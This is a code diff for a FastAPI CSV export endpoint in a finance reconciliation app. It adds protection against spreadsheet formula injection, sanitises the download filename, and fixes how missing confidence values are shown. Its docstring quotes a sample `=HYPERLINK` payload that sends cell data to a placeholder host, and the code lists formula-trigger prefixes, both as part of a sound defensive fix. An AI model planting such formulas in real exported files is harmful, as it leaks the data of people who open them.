@@ -1,6 +1,7 @@
 import csv
 import io
-from typing import List, Optional
+import re
+from typing import Any, List, Optional
 from fastapi import APIRouter, Depends, HTTPException, Query, Response
 from sqlalchemy.orm import Session
 
@@ -9,6 +10,32 @@ from src.db.database import get_db
 from src.db.repository import FinanceRepository
 
 router = APIRouter(prefix="/api/runs", tags=["transactions"])
+
+#: Leading characters that make a spreadsheet treat a cell as a formula.
+_CSV_INJECTION_PREFIXES = ("=", "+", "-", "@", "\t", "\r")
+
+#: Characters allowed in a run id when it is echoed into a Content-Disposition
+#: filename. Anything else is stripped rather than escaped.
+_UNSAFE_FILENAME_CHARS = re.compile(r"[^A-Za-z0-9._-]")
+
+
+def _csv_safe(value: Any) -> Any:
+    """
+    Neutralises spreadsheet formula injection in a CSV cell.
+
+    The Reason and Recommended Action columns carry free text authored by the
+    LLM (and, via uploaded CSVs, by whoever supplied the data). A value like
+    ``=HYPERLINK("http://x/?"&A1)`` is inert in the API response but executes
+    when the exported ledger is opened in Excel, Sheets, or LibreOffice, so it
+    is prefixed with an apostrophe here. Numeric cells are passed through
+    untouched so amounts stay machine-readable.
+    """
+    if value is None or isinstance(value, (int, float)):
+        return value
+    text = str(value)
+    if text.startswith(_CSV_INJECTION_PREFIXES):
+        return "'" + text
+    return text
 
 
 @router.get("/{run_id}/transactions", response_model=List[TransactionDetailResponse])
@@ -88,24 +115,41 @@ def export_run_transactions_csv(run_id: str, db: Session = Depends(get_db)):
     for t in transactions:
         detail = FinanceRepository.get_transaction_detail(db, run_id, t.transaction_id)
         inv = detail.get("agent_investigation") if detail else None
+
+        if inv:
+            decision = inv.get("decision") or "N/A"
+            # confidence is nullable in the DB; treat a missing value as
+            # "not measured" rather than rendering it as full confidence.
+            raw_conf = inv.get("confidence")
+            confidence = "N/A" if raw_conf is None else f"{float(raw_conf) * 100:.0f}%"
+            reason = inv.get("reason") or ""
+            recommended_action = inv.get("recommended_action") or ""
+        elif t.status == "RECONCILED":
+            decision, confidence = "RECONCILED", "100%"
+            reason, recommended_action = "Reconciled successfully", ""
+        else:
+            decision, confidence = "HUMAN_REVIEW", "0%"
+            reason, recommended_action = "", ""
+
         writer.writerow([
-            t.transaction_id,
-            t.status,
-            t.exception_type or "None",
+            _csv_safe(t.transaction_id),
+            _csv_safe(t.status),
+            _csv_safe(t.exception_type or "None"),
             t.payment_amount if t.payment_amount is not None else "",
             t.gross_amount if t.gross_amount is not None else "",
             t.fee if t.fee is not None else "",
             t.expected_net_amount if t.expected_net_amount is not None else "",
             t.bank_amount if t.bank_amount is not None else "",
             t.difference if t.difference is not None else 0,
-            inv.get("decision", "N/A") if inv else ("RECONCILED" if t.status == "RECONCILED" else "HUMAN_REVIEW"),
-            f"{(inv.get('confidence', 1.0) * 100):.0f}%" if inv else ("100%" if t.status == "RECONCILED" else "0%"),
-            inv.get("reason", "Reconciled successfully" if t.status == "RECONCILED" else "") if inv else ("Reconciled successfully" if t.status == "RECONCILED" else ""),
-            inv.get("recommended_action", "") if inv else "",
+            _csv_safe(decision),
+            confidence,
+            _csv_safe(reason),
+            _csv_safe(recommended_action),
         ])
 
     csv_content = output.getvalue()
-    filename = f"reconciliation_ledger_{run_id}.csv"
+    safe_run_id = _UNSAFE_FILENAME_CHARS.sub("_", run_id)[:64] or "run"
+    filename = f"reconciliation_ledger_{safe_run_id}.csv"
     return Response(
         content=csv_content,
         media_type="text/csv",
